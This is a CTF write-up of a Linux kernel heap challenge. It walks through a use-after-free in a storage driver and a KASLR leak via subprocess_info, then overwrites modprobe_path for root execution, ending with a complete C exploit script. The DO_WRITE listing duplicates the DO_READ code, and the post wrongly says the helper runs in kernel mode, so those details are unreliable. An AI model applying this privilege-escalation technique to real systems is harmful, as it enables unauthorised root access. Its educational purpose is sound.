+++
date = '2025-10-26T21:39:54+08:00'
draft = false
title = 'AYCEP2025 verysecretstorage Modprobe Path overwrite'
categories = ["writeup"]
tags = ["kernel", "pwn"]
+++

#### Introduction:

WHATS'S UP GUYS! Welcome back to another text based youtube video. Today we will be reading a writeup about [verysecretstorage](https://github.com/KaligulaArmblessed/CTF-Challenges/tree/main/AYCEP_2024/verysecretstorage), a challenge made by [Kaligula](https://kaligulaarmblessed.github.io/) for AYCEP2024 (yes I am a year late and missed out greatly). This was my first kernel heap challenge as well as my first real kernel challenge and it was pretty fun. 

#### Table of Contents:

1. Protections
1. Binary analysis
1. Exploit

#### Protections:

Since this is my first kpwn challenge I will be going through the common protections as well as the ones that people do not talk about often in beginner writeups (in my exp pls no sue me).

As usual, protections help narrow down the options so we have:

1. **SMEP** (Supervisor mode execution protection) marks all userland pages in the page table as non-executable. This prevents the kernel from executing code in userland. This means that no userland code can run with kernel privileges.
1. **SMAP** (Supervisor mode access prevention) prevents data access to userland pages from kernel mode. This means that you also cannot read userland memory from the kernel unless you use `copy_to_user()` and `copy_from_user()`.
1. **KASLR** (Kernel address space layout randomisation) this is just aslr but in the kernel. There is a special kind called fg-kaslr but I will not go into details for it here.
1. **KPTI** (Kernel page-table isolation) This completely separates user-space and kernel-space page tables. With this, userland does not even know that the kernel exists, only a minimal trampoline is left to handle transitions between kernel and user safely.

#### Convenient protections that are not set:

1. **CONFIG_SLAB_FREELIST_RANDOM** makes it so that freed objects go into the freelist in a random order instead of LIFO like normal. Its not set here so it means that there will be no need to do any heap fengshui.
1. **CONFIG_STATIC_USERMODEHELPER** is not set so a modprobe path overwrite is possible (foreshadowing).
1. **CONFIG_SYSVIPC** is set so there are msg_msg structs.

#### Modprobe path overwrite:

`modprobe` is a program used to load and unload kernel modules. The path to it is a kernel global variable, which by default is `/sbin/modprobe`. Very cool but how is it helpful? 

Well the path is stored in a kernel symbol `modprobe_path` and is also in a writable page. The program that is stored in `modprobe_path` also gets executed if we try to call `execve()` on a file whose magic bytes are unknown to the system. Sooooooooooooooooooo if we somehow overwrite `modprobe_path` and change the path to another program that we control, when a file with an unknown file signature is ran, that program is run in kernel mode which gives me arbitrary code execution with root privileges.

#### Binary analysis:

Some set up stuff at the start:

```c
struct req {
    uint64_t idx;
    uint64_t name_addr;
    uint64_t note_size;
    uint64_t note_addr;
};

struct box {
    char name[0x50];
    uint64_t note_size; 
    uint64_t note_addr;
};


void * box_array[0x30] = {0};
unsigned int box_count = 0;
```

#### DO_CREATE:
```c
case DO_CREATE: { 
  if (box_count >= 0x30) {
      mutex_unlock(&storage_mutex); 
      pr_info("Too many boxes!\n"); 
      return -1; 
      break;
  }
  box = kmalloc(sizeof(struct box), GFP_KERNEL);
  ret = copy_from_user(buf, (void __user *) user_data.name_addr, 0x50-1);
  memcpy(&box->name, buf, 0x50-1); 
  memset(buf, 0, sizeof(buf));
  if (user_data.note_size != 0) {
      note = kmalloc(user_data.note_size, GFP_KERNEL);
      box->note_addr = (uint64_t) note; 
      box->note_size = user_data.note_size;
      
      // Copy information to the note
      ret = copy_from_user(buf, (void __user *) user_data.note_addr, box->note_size);
      memcpy((void *) note, buf, box->note_size-1);
      memset(buf, 0, sizeof(buf));
  }
  box_array[box_count] = box; 
  box_count = box_count + 1; 
  mutex_unlock(&storage_mutex); 
  return 0; 
  break;
}

```
Allocates a box with the GFP_KERNEL flag. The size of box is 0x60 so it goes into the kmalloc-96 cache. You also can add a note by passing in note address and size along with the req struct.

#### DO_READ:

```c
case DO_READ: {
      if (user_data.idx > (box_count - 1)) {
          mutex_unlock(&storage_mutex); 
          pr_info("Invalid idx\n"); 
          return -1; 
          break;
      }
      box = box_array[user_data.idx]; 
      memcpy(buf, &box->name, 0x50-1); 
      ret = copy_to_user((void __user *)user_data.name_addr, buf, 0x50-1);
      if (box->note_addr != 0 && box->note_addr != 0x10) {
          memset(buf, 0x0, sizeof(buf)); 
          memcpy(buf, (void *)box->note_addr, box->note_size-1); 
          ret = copy_to_user((void __user *)user_data.note_addr, buf, box->note_size); 
      }
      mutex_unlock(&storage_mutex); 
      return 0; 
      break;
  }
```

Reads the name and note from the box into the buffer provided by the req struct.

#### DO_WRITE:

```c
case DO_READ: {
    if (user_data.idx > (box_count - 1)) {
        mutex_unlock(&storage_mutex); 
        pr_info("Invalid idx\n"); 
        return -1; 
        break;
    }
    box = box_array[user_data.idx]; 
    memcpy(buf, &box->name, 0x50-1); 
    ret = copy_to_user((void __user *)user_data.name_addr, buf, 0x50-1);
    if (box->note_addr != 0 && box->note_addr != 0x10) {
        memset(buf, 0x0, sizeof(buf)); 
        memcpy(buf, (void *)box->note_addr, box->note_size-1); 
        ret = copy_to_user((void __user *)user_data.note_addr, buf, box->note_size); 
    }
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```

Writes a name and note to the box.

#### DO_RESIZE:

```c
case DO_RESIZE: {
    if (user_data.idx > (box_count - 1)) {
        mutex_unlock(&storage_mutex); 
        pr_info("Invalid idx\n"); 
        return -1; 
        break;
    }
    box = box_array[user_data.idx]; 
    ret = copy_from_user(&box->name, (void __user *) user_data.name_addr, 0x50-1);
    if (user_data.note_size != 0) {
        kfree((void *)box->note_addr);
        note = kmalloc(user_data.note_size, GFP_KERNEL); 
        box->note_addr = (uint64_t)note; 
        box->note_size = user_data.note_size; 
        ret = copy_from_user(note, (void __user *) user_data.note_addr, user_data.note_size);
    }
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```

Resizes the note and copies the new note into it.

#### DO_DELETE:

```c
case DO_DELETE: {
    if (user_data.idx > (box_count - 1)) {
        mutex_unlock(&storage_mutex); 
        pr_info("Invalid idx\n"); 
        return -1; 
        break;
    }
    box = box_array[user_data.idx]; 
    if (box->note_addr != 0 && box->note_addr != 0x10) {
        kfree((void *)box->note_addr); 
        box->note_addr = 0; 
    }
    kfree(box); 
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```

Deletes a box and holy crap finally a vulnerability. The function frees the note and nulls it but when it frees the box it does not null it, leaving a dangling pointer to the box that we can fandangle via a use-after-free(UAF). Knowing we have the ability to read or write to a box even after freeing it, what can we do?

#### Exploit:

Firstly, lets get some minor setup for the exploit out of the way. We should pin all threads of the process to one CPU core so all allocations come from the same cache.

```c

int cpuaff(void) {
  puts("Setting cpu affinity\n");
  cpu_set_t cpu;
  CPU_ZERO(&cpu);
  CPU_SET(0, &cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
    perror("Sched_setaffinity not working\n");
    exit(-1);
  }
  return 0;
}
```

Since KASLR is active, we are going to need a kernel leak to calculate the address of `modprobe path`. How in the frick frack snick snack do we do that here?

Well, in my experience so far, kernel heap challenges often get leaks by overlapping kernel structs instead of something like the unsorted bin libc leak in userland. Since I can read the boxes name and note, I wanna get something that fits into the kmalloc-96 cache and also gets me a kernel leak so scrolling through [this site](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/) we find a struct called `subprocess_info` that fits into kmalloc-96 and `work.func` can be leaked to get the kernel base yipee.

So we allocate 2 boxes, box0 and box1. We free box0 then immediately reclaim its spot with a `subprocess_info` by calling `socket(22, AF_INET, 0)`.

```c
  create(name, 0x100, note);
  create(name, 0x100, note);
  dodelete(0);
  socket(22, AF_INET, 0);
  doread(0, readname, readnote);
```

Since box0 is deleted but not nulled we can still read it and ta da, we get the information that `subprocess_info` is holding.


![subprocess_info](/post/secretstorage/images/subprocess_info.jpg)

```c
struct subprocess_info {
	struct work_struct work;
	struct completion *complete;
	const char *path;
	char **argv;
	char **envp;
	int wait;
	int retval;
	int (*init)(struct subprocess_info *info, struct cred *new);
	void (*cleanup)(struct subprocess_info *info);
	void *data;
} __randomize_layout;

struct work_struct {
	atomic_long_t data;
	struct list_head entry;
	work_func_t func;
```

This is the struct and we can see that it has a work_struct member then we dig deeper and we see that the work.func leak we need is at index 3 of the leaks. (1st 8 bytes for `data`, 16 bytes for `list_head` and finally 8 bytes for `work.func`)

If we start the qemu with root we can also check that the leak is pointing to `call_usermodehelper_exec_work`.

![call_usermodehelper_exec_work](/post/secretstorage/images/call_usermodehelper_exec_work.jpg)

Since the address `call_usermodehelper_exec_work` and `modprobe_path` are all relative we can just do some math to find `modprobe_path`.

```c
  //offset of mpp from call_usermodehelper_exec_work is 0x1a94080
  uint64_t mpp = ((uint64_t *)readname)[3] + 0x1a94080;

```

Now that we have the `modprobe_path` address we need to resize the note to go into 0x60 cache and overwrite over box0 again and making sure that the new note size is big enough and the note address is the address of `modprobe_path`.

Then we write to box0 with the new note being the path of the script that I want ran with root privileges.

```c
  char overwrite[0x10];
  memset(overwrite, 0, sizeof(overwrite));
  strcpy(overwrite, "/tmp/x\x00");
  char resize[0x100] = {0};
  memset(resize, 0x45, 0x50);
  ((uint64_t *)resize)[10] = 0x10;
  ((uint64_t *)resize)[11] = mpp;
  doresize(0, name, 0x60, resize);
  dowrite(0, name, 0x10, overwrite);
  get_flag();
```

Here is the before overwrite:

![beforeoverwrite](/post/secretstorage/images/beforeoverwrite.jpg)

And after overwrite:

![afteroverwrite](/post/secretstorage/images/afteroverwrite.jpg)


```c
int get_flag(void) {
  system("echo '#!/bin/sh\nhead -n 1 /dev/sda > /tmp/flag\nchmod 777 "
         "/tmp/flag' > /tmp/x");
  system("chmod +x /tmp/x");

  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
  system("chmod +x /tmp/dummy");

  printf("[+] Run unknown file\n");
  system("/tmp/dummy");

  printf("[+] Read flag\n");
  system("cat /tmp/flag");

  return 0;
}
```

The script basically copies the stuff in `/dev/sda` into `/tmp/flag` as well as granting it full permissions and makes it executable. Then it makes an unknown file and runs it which should then trigger `modprobe_path` and run the script and now the flag from `/dev/sda` is inside `/tmp/flag` and we can view it.

![finalflag](/post/secretstorage/images/finalflag.jpg)


WAHEY! It worked, that's fantabbitastic.

Overall, this challenge was very fun and got me thinking in the kernel pwn mindset instead of the userland pwn mindset and serves as a great introduction to possible kernel structs and how the kernel heap works.

Anyways, that's it for this text based youtube video. Please make sure to like 👍 and soobscribe and make sure to turn on the notification bell🔔 and see you guys [next time](https://youtu.be/oC2zvQ6B1Dw?si=Roa2V2vUd-jVzFRb).

Here is my script.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define DO_CREATE 0xc020ca00
#define DO_READ 0xc020ca01
#define DO_WRITE 0xc020ca02
#define DO_RESIZE 0xc020ca03
#define DO_DELETE 0xc020ca04

struct req {
  uint64_t idx;
  uint64_t name_addr;
  uint64_t note_size;
  uint64_t note_addr;
};

struct box {
  char name[0x50];
  uint64_t note_size;
  uint64_t note_addr;
};

int fd;
void opendev(void) {
  fd = open("/dev/secretstorage", O_RDWR);
  if (fd < 0) {
    perror("open failed\n");
  }
  printf("Device opened successfully\n");
}

int cpuaff(void) {
  puts("Setting cpu affinity\n");
  cpu_set_t cpu;
  CPU_ZERO(&cpu);
  CPU_SET(0, &cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
    perror("Sched_setaffinity not working\n");
    exit(-1);
  }
  return 0;
}

int create(char *name, uint64_t note_size, char *note) {
  printf("Creating box\n");
  struct req userdata;
  userdata.name_addr = (uint64_t)name;
  userdata.note_size = note_size;
  userdata.note_addr = (uint64_t)note;
  int ret = ioctl(fd, DO_CREATE, &userdata);
  if (ret < 0) {
    perror("DO CREATE FAILED");
  }
  return 0;
}

int doread(uint64_t idx, char *namebuf, char *notebuf) {
  printf("Reading from idx: %d\n", (int)idx);
  struct req userdata;
  userdata.idx = idx;
  userdata.name_addr = (uint64_t)namebuf;
  userdata.note_addr = (uint64_t)notebuf;
  int ret = ioctl(fd, DO_READ, &userdata);
  if (ret < 0) {
    perror("DO_READ FAILED");
  }
  return 0;
}

int dowrite(uint64_t idx, char *name, uint64_t note_size, char *note) {
  printf("Writing to box at idx: %d\n", (int)idx);
  struct req userdata;
  userdata.idx = idx;
  userdata.name_addr = (uint64_t)name;
  userdata.note_size = note_size;
  userdata.note_addr = (uint64_t)note;
  int ret = ioctl(fd, DO_WRITE, &userdata);
  if (ret < 0) {
    perror("DO WRITE FAILED");
  }
  return 0;
}

int doresize(uint64_t idx, char *name, uint64_t note_size, char *note) {
  printf("Resizing box at idx: %d\n", (int)idx);
  struct req userdata;
  userdata.idx = idx;
  userdata.name_addr = (uint64_t)name;
  userdata.note_size = note_size;
  userdata.note_addr = (uint64_t)note;
  int ret = ioctl(fd, DO_RESIZE, &userdata);
  if (ret < 0) {
    perror("DO_RESIZE FAILED");
  }
  return 0;
}

int dodelete(uint64_t idx) {
  printf("Deleting box at idx: %d\n", (int)idx);
  struct req userdata;
  userdata.idx = idx;
  int ret = ioctl(fd, DO_DELETE, &userdata);
  if (ret < 0) {
    perror("DO_DELETE FAILED");
  }
  return 0;
}

int get_flag(void) {
  system("echo '#!/bin/sh\nhead -n 1 /dev/sda > /tmp/flag\nchmod 777 "
         "/tmp/flag' > /tmp/x");
  system("chmod +x /tmp/x");

  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
  system("chmod +x /tmp/dummy");

  printf("[+] Run unknown file\n");
  system("/tmp/dummy");

  printf("[+] Read flag\n");
  system("cat /tmp/flag");

  return 0;
}

int main() {
  cpuaff();
  opendev();
  char name[0x50] = {0};
  char note[0x100];
  char readname[0x100] = {0};
  char readnote[0x100] = {0};
  memset(note, 0x42, sizeof(note));
  create(name, 0x100, note);
  create(name, 0x100, note);
  dodelete(0);
  socket(22, AF_INET, 0);
  doread(0, readname, readnote);
  printf("subprocess_info struct\n");
  for (int i = 0; i < (0x50 / 8); i++) {
    printf("%d: 0x%llx\n", i, ((uint64_t *)readname)[i]);
  }
  // offset of mpp from call_usermodehelper_exec_work is 0x1a94080
  uint64_t mpp = ((uint64_t *)readname)[3] + 0x1a94080;
  printf("This is mpp: %llx\n", mpp);
  char overwrite[0x10];
  memset(overwrite, 0, sizeof(overwrite));
  strcpy(overwrite, "/tmp/x\x00");
  char resize[0x100] = {0};
  memset(resize, 0x45, 0x50);
  ((uint64_t *)resize)[10] = 0x10;
  ((uint64_t *)resize)[11] = mpp;
  doresize(0, name, 0x60, resize);
  dowrite(0, name, 0x10, overwrite);
  get_flag();
  return 0;
}
```
```
